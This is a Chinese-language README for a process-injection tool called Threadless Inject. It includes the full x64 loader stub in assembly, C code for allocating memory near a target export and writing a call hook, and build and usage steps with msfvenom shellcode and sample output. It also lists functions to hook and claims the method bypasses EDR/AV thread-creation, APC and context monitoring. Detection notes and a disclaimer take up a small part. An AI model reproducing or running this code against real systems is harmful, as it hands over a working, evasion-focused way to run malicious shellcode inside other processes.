# Threadless Inject - 无线程代码注入

## 概述

**Threadless Inject** 是一种创新的进程注入技术，通过 Hook 目标进程中已加载 DLL 的导出函数来触发 shellcode 执行，完全不需要创建远程线程、使用 APC 或修改线程上下文。

## 技术原理

### 核心思想

传统的进程注入技术（如 CreateRemoteThread、APC 注入、线程劫持）都需要以某种方式启动或劫持线程来执行 shellcode。Threadless Inject 完全避免这些方法，转而利用目标进程的正常执行流程：

1. 在目标进程中已加载的 DLL（如 ntdll.dll）中选择一个导出函数
2. Hook 该函数的前 8 字节为一个 `call` 指令
3. `call` 跳转到我们注入的 shellcode loader stub
4. 等待目标进程正常调用该函数时自动触发 shellcode 执行
5. Shellcode 执行后自动恢复原始字节（一次性 hook）

### 为什么需要在 ±2GB 范围内分配内存？

x64 架构的相对调用指令（`call` 和 `jmp`）只支持 32 位有符号偏移量，范围是 ±2GB。因此必须在被 hook 的函数地址 ±2GB 范围内分配内存。

```
相对调用指令格式：
E8 XX XX XX XX      ; call rel32

rel32 = 目标地址 - (当前指令地址 + 5)
```

### 执行流程

```
[注入器进程]
  1. 在本地获取 DLL!Export 地址
     └─> LoadLibraryA(dllName)
     └─> GetProcAddress(exportName)

  2. 打开目标进程
     └─> OpenProcess(PROCESS_VM_*)

  3. 在 ±2GB 范围内分配内存
     └─> FindMemoryHole(exportAddr)
     └─> VirtualAllocEx(nearAddr, size)

  4. 生成 Shellcode Loader Stub
     └─> 嵌入原始 8 字节
     └─> call shellcode

  5. 写入载荷（Stub + Shellcode）
     └─> WriteProcessMemory(loaderAddr, payload)

  6. Hook 导出函数
     └─> VirtualProtectEx(exportAddr, RWX)
     └─> WriteProcessMemory(exportAddr, callOpcode)

  7. 等待 hook 触发
     └─> 监控导出函数字节是否恢复

[目标进程]
  当正常调用被 hook 的函数时：
  1. 执行 call 指令 → 跳转到 Loader Stub
  2. Loader Stub：
     └─> pop rax              ; 获取返回地址
     └─> sub rax, 5           ; 计算函数地址
     └─> 保存寄存器
     └─> mov [rax], rcx       ; 恢复原始 8 字节
     └─> call shellcode       ; 执行 shellcode
     └─> 恢复寄存器
     └─> jmp rax              ; 跳回原函数
  3. Shellcode 执行
  4. 返回原函数继续执行
```

### Shellcode Loader Stub 详解

```asm
start:
    pop    rax                    ; 获取返回地址（被 hook 的函数地址 + 5）
    sub    rax, 0x5               ; 减去 call 指令大小，得到函数地址
    push   rax                    ; 保存函数地址（稍后跳回）

    ; 保存寄存器（x64 fastcall 约定）
    push   rcx                    ; 参数 1
    push   rdx                    ; 参数 2
    push   r8                     ; 参数 3
    push   r9                     ; 参数 4
    push   r10                    ; 临时寄存器
    push   r11                    ; 临时寄存器

    ; 恢复原始字节（解除 hook）
    movabs rcx, 0x1122334455667788  ; 原始 8 字节
    mov    QWORD PTR [rax], rcx

    ; 栈对齐并调用 shellcode
    sub    rsp, 0x40              ; 栈对齐（x64 ABI 要求）
    call   shellcode              ; 相对调用 shellcode
    add    rsp, 0x40

    ; 恢复寄存器
    pop    r11
    pop    r10
    pop    r9
    pop    r8
    pop    rdx
    pop    rcx
    pop    rax                    ; 恢复函数地址

    jmp    rax                    ; 跳回原函数（已恢复为原始字节）

shellcode:
    ; 用户提供的 shellcode 从这里开始
```

### 关键代码

#### 1. 查找内存洞穴

```c
PVOID FindMemoryHole(HANDLE hProcess, PVOID exportAddress, SIZE_T size) {
    ULONG_PTR exportAddr = (ULONG_PTR)exportAddress;
    ULONG_PTR startAddr = (exportAddr & 0xFFFFFFFFFFF70000) - 0x70000000;
    ULONG_PTR endAddr = exportAddr + 0x70000000;

    for (ULONG_PTR addr = startAddr; addr < endAddr; addr += 0x10000) {
        PVOID allocatedAddr = VirtualAllocEx(
            hProcess,
            (PVOID)addr,
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if (allocatedAddr != NULL) {
            return allocatedAddr;
        }
    }

    return NULL;
}
```

#### 2. 生成 Hook Stub

```c
void GenerateHookStub(BYTE* loaderStub, UINT64 originalBytes) {
    memcpy(loaderStub, g_LoaderStub, LOADER_STUB_SIZE);

    // 偏移 0x12 处是 movabs rcx, imm64 的立即数部分
    *(UINT64*)(loaderStub + 0x12) = originalBytes;
}
```

#### 3. 安装 Hook

```c
// 读取原始字节
UINT64 originalBytes;
ReadProcessMemory(hProcess, exportAddr, &originalBytes, 8, &bytesRead);

// 计算相对偏移
LONG_PTR relativeOffset = (LONG_PTR)remoteLoaderAddr - ((LONG_PTR)exportAddr + 5);

// 生成 call 指令
BYTE callOpcode[5];
callOpcode[0] = 0xE8;  // call
*(LONG*)(callOpcode + 1) = (LONG)relativeOffset;

// 修改内存保护为 RWX
VirtualProtectEx(hProcess, exportAddr, 8, PAGE_EXECUTE_READWRITE, &oldProtect);

// 写入 hook
WriteProcessMemory(hProcess, exportAddr, callOpcode, 5, &bytesWritten);
```

## 技术优势

### 1. 绕过检测

- ✅ **不使用 CreateRemoteThread**：避免远程线程创建检测
- ✅ **不使用 QueueUserAPC**：避免 APC 注入检测
- ✅ **不使用 SetThreadContext**：避免线程上下文劫持检测
- ✅ **利用正常执行流程**：Shellcode 在目标进程的合法调用栈中执行
- ✅ **一次性 Hook**：执行后自动恢复，不留持久化痕迹

### 2. 隐蔽性

- 利用目标进程自己的函数调用触发
- 不创建新线程或修改现有线程
- Shellcode 在合法的栈帧中执行
- 自动清理和恢复原始状态

### 3. 技术创新

- 首个完全不依赖线程操作的注入技术
- 利用 x64 相对调用特性
- 简洁的 shellcode loader stub 设计
- 自恢复机制（执行即解 hook）

## 使用方法

### 编译

```bash
# Windows (MinGW)
build.bat

# Linux/Git Bash
bash build.sh

# 手动编译
gcc -O2 -o build\threadless_inject.exe src\threadless_inject.c -lpsapi
gcc -O2 -o build\generate_shellcode.exe src\generate_shellcode.c
```

### 准备

1. **生成 Shellcode**：
   ```bash
   # 使用内置生成器
   build\generate_shellcode.exe calc payload.bin

   # 或使用 msfvenom
   msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o payload.bin
   ```

2. **选择目标进程和导出函数**：
   - 进程必须已加载目标 DLL
   - 选择频繁调用的函数以快速触发
   - 使用 Process Monitor 观察进程调用了哪些函数

### 执行

```cmd
# 基本用法
build\threadless_inject.exe <PID> <DLL名称> <导出函数> [shellcode文件]

# 示例：注入到记事本进程
# 1. 启动记事本
start notepad

# 2. 获取 PID（如 1234）
tasklist | findstr notepad

# 3. 生成 shellcode
build\generate_shellcode.exe calc payload.bin

# 4. 注入（使用 NtOpenFile，打开文件时触发）
build\threadless_inject.exe 1234 ntdll.dll NtOpenFile payload.bin

# 5. 触发执行（在记事本中打开文件）
#    点击 "文件" -> "打开"

# 输出示例：
# ======================================
#   Threadless Inject - 无线程注入
# ======================================
#
# [1] 定位导出函数
#     [+] 找到 ntdll.dll!NtOpenFile @ 0x00007FF8B2C10000
#
# [2] 打开目标进程
#     [+] 成功打开进程 PID=1234
#
# [3] 分配内存
#     [*] 查找内存洞穴（在 0x00007FF8B2C10000 ±2GB 范围内）
#     [+] 找到内存洞穴：0x00007FF8B2A00000（大小：120 字节）
#
# [4] 读取原始字节
#     [+] 原始字节：0x4C8BD1E988000000
#
# [5] 生成 Hook Stub
#     [+] Hook Stub 已生成（大小：55 字节）
#
# [6] 构建载荷
#     [+] 载荷大小：120 字节（Stub: 55 + Shellcode: 65）
#
# [7] 写入载荷到目标进程
#     [+] 已写入 120 字节到 0x00007FF8B2A00000
#
# [8] 修改内存保护
#     [+] 内存保护已修改为 PAGE_EXECUTE_READ
#
# [9] 生成 Hook
#     [*] 相对偏移：0xFFFFFFFFFFE00000
#     [*] Call 指令：E8 FB FF DF FF
#
# [10] 修改导出函数内存保护
#     [+] 导出函数内存保护已修改为 PAGE_EXECUTE_READWRITE
#
# [11] 写入 Hook
#     [+] Hook 已安装到 ntdll.dll!NtOpenFile
#
# [12] 等待 Hook 触发
#     [*] 正在等待目标进程调用 ntdll.dll!NtOpenFile...
#     [*] 最多等待 60 秒
#
#     [+] 检测到 Hook 已被恢复（3 秒后）
#
# [13] 清理
#     [+] 已恢复内存保护并释放载荷内存
#
# [+] Threadless 注入成功！Shellcode 已执行
```

## 推荐的导出函数

### ntdll.dll（推荐）

- **NtOpenFile**：打开文件时调用（打开对话框、读取配置等）
- **NtCreateFile**：创建文件时调用
- **NtReadFile**：读取文件时调用（几乎所有 I/O 操作）
- **NtWriteFile**：写入文件时调用
- **NtQueryInformationFile**：查询文件信息时调用

### kernel32.dll

- **CreateFileW**：创建/打开文件（高层 API）
- **ReadFile**：读取文件
- **WriteFile**：写入文件
- **GetFileSize**：获取文件大小

### user32.dll（GUI 程序）

- **GetMessageW**：消息循环（GUI 程序频繁调用）
- **PeekMessageW**：检查消息队列
- **TranslateMessage**：翻译消息
- **DispatchMessageW**：分发消息

## 触发方法

根据选择的导出函数，可以通过以下方式触发：

| 导出函数 | 触发方法 |
|---------|---------|
| NtOpenFile / CreateFileW | 在目标程序中打开文件对话框 |
| NtReadFile / ReadFile | 目标程序读取任何文件 |
| GetMessageW | GUI 程序接收任何窗口消息 |
| NtQueryInformationFile | 目标程序查询文件属性 |

## 防御检测

### EDR/AV 绕过

- **线程创建监控**：✅ 绕过（不创建线程）
- **APC 注入监控**：✅ 绕过（不使用 APC）
- **线程上下文修改监控**：✅ 绕过（不修改上下文）
- **内存分配监控**：⚠️ 仍使用 VirtualAllocEx
- **内存写入监控**：⚠️ 仍使用 WriteProcessMemory
- **内存保护修改监控**：⚠️ 修改导出函数为 RWX

### 检测方法

1. **导出函数完整性检查**：
   - 监控常见 DLL 导出函数的前 N 字节
   - 检测异常的 `call` 指令（E8 XX XX XX XX）

2. **内存保护监控**：
   - 检测 ntdll.dll/.text 节区被修改为 RWX
   - 监控 VirtualProtectEx 修改系统 DLL 内存

3. **行为分析**：
   - 检测导出函数被调用后内存发生变化
   - 监控短时间内导出函数字节被修改后恢复

## 局限性

1. **DLL 加载要求**：
   - 目标 DLL 必须已被目标进程加载
   - 无法注入未加载 DLL 的进程

2. **触发时机不确定**：
   - 依赖目标进程调用被 hook 的函数
   - 可能需要手动触发（如打开文件对话框）
   - 某些函数可能长时间不被调用

3. **±2GB 内存限制**：
   - 必须在导出函数地址附近分配内存
   - 如果该区域内存紧张可能分配失败

4. **一次性执行**：
   - Shellcode 执行后 hook 自动解除
   - 需要持久化需要修改设计（但会降低隐蔽性）

## 原始研究

- **研究者**：CCob
- **发布时间**：2023
- **发布场合**：Bsides Cymru 2023
- **演讲标题**：Needles Without the Thread
- **参考实现**：[CCob/ThreadlessInject](https://github.com/CCob/ThreadlessInject)

## MITRE ATT&CK

- **战术**：Defense Evasion, Privilege Escalation
- **技术**：T1055 (Process Injection)
- **子技术**：T1055.012 (Process Hollowing) - 虽然不完全匹配，但原理相似

## 相关技术

- **Module Stomping**：覆写已加载模块的代码段
- **Function Stomping**：覆写未使用的导出函数
- **Inline Hooking**：Hook 函数入口点进行劫持
- **IAT Hooking**：劫持导入地址表

## 技术对比

| 技术 | 创建线程 | 使用 APC | 修改上下文 | 触发方式 |
|------|---------|---------|-----------|---------|
| CreateRemoteThread | ✅ | ❌ | ❌ | 立即执行 |
| APC 注入 | ❌ | ✅ | ❌ | Alertable 状态 |
| 线程劫持 | ❌ | ❌ | ✅ | 恢复线程 |
| **Threadless Inject** | ❌ | ❌ | ❌ | 函数调用 |

## 测试环境

- **操作系统**：Windows 10/11 (x64)
- **编译器**：GCC (MinGW-w64)
- **架构**：x64（仅支持 64 位）

## 免责声明

本技术仅供安全研究和教育目的使用。使用者应遵守当地法律法规，不得用于非法用途。作者不对任何滥用行为负责。

## 参考资料

- [ThreadlessInject GitHub](https://github.com/CCob/ThreadlessInject)
- [Bsides Cymru 2023 - Needles Without the Thread](https://pretalx.com/bsides-cymru-2023-2022/talk/BNC8W3/)
- [Process Injection - MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)
